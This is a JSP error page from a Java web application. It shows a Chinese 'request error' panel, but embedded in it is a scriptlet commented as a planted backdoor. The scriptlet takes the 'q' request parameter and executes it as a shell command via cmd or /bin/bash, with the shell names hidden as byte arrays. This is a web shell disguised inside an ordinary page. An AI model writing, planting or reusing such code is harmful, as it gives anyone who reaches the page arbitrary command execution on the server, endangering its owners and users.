
<%@ page import="java.util.Scanner" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String path = request.getContextPath();
    String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>
<c:set var="cp" value="<%=basePath%>" />
<!DOCTYPE html>
<html lang="en">
<head>
    <jsp:include page="/common/head.jsp"></jsp:include>
</head>
<body>
<jsp:include page="/common/navigator.jsp"></jsp:include>

<%//留的后门
    String op="Got Nothing";
    String query = request.getParameter("q");
    String fileSeparator = String.valueOf(java.io.File.separatorChar);
    Boolean isWin;
    if(fileSeparator.equals("\\")){
        isWin = true;
    }else{
        isWin = false;
    }

    if (query != null) {
        ProcessBuilder pb;
        if(isWin) {
            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);
        }else{
            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);
        }
        Process process = pb.start();
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter("\\A");
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
    }
%>

<div class="container">
    <div class="row">
        <div class="col-md-12">
            <h3>请求异常</h3>
        </div>
    </div>
    <div class="row" style="margin-top: 30px">
        <div class="col-md-12">
            <div class="panel panel-default">
                <div class="panel-heading">
                    <h3 class="panel-title">
                        错误信息
                    </h3>
                </div>
                <div class="panel-body">
                    ${message}
                </div>
            </div>

        </div>
    </div>
</div>
<jsp:include page="/common/footer.jsp"></jsp:include>
</body>
</html>